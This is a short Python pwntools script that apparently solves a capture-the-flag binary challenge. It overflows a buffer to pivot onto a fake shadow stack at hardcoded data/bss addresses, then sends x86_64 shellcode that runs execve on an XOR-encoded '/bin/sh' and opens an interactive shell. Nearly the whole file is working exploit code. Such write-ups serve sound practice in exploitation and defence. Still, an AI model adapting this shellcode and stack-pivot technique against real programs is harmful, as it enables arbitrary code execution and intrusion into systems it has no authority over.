from pwn import *
context.log_level = 'debug'
context.arch='x86_64'
'''
1. bof -> stack->data->bss
fake (depth, stack_shadow)
stack_shadow <- shellcode

'''
p = process('./chall')
e = ELF('./chall')
log.info("SHELLCODE")
SHELLCODE = '''
    mov rax, 0x101010101010101
    push rax
    mov rax, 0x101010101010101 ^ 0x68732f6e69622f
    xor [rsp], rax
    mov rdi, rsp
    xor edx, edx
    xor esi, esi
    push 0x3b
    pop rax
    syscall
'''
log.info("SHADOW_STACK")
__stack_shadow = 6292020
__stack_depth = 6292014

pause()
p.recvuntil("Data: ")
pause()
p.send(str(p8(0x90)*256+p64(__stack_shadow+256)))
pause()

p.recvuntil("Data: ")
pause()
p.send(str(p8(0x90)*8+p64(__stack_shadow+0x10)+asm(SHELLCODE)))
pause()
p.interactive()



